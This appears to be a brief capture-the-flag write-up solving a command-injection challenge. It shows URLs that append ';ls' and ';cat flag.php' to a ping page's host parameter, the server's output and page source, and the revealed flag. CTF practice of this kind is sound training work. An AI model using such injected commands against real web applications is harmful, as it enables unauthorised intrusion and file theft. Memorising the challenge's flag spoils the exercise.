http://34.179.231.75:30654/index.php?host=127.0.0.1

Command executed: ping -c 2 127.0.0.1

http://34.179.231.75:30654/index.php?host=127.0.0.1;ls

flag.php
index.php
Command executed: ping -c 2 127.0.0.1;ls

http://34.179.231.75:30654/index.php?host=127.0.0.1;cat%20flag.php


Command executed: ping -c 2 127.0.0.1;cat flag.php

//but when inspecting:

<html><head><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style></head><body><pre><?php //CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}


?>
</pre><pre style="color:red;">Command executed: ping -c 2 127.0.0.1;cat flag.php</pre></body></html>

the flag is:
**CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}**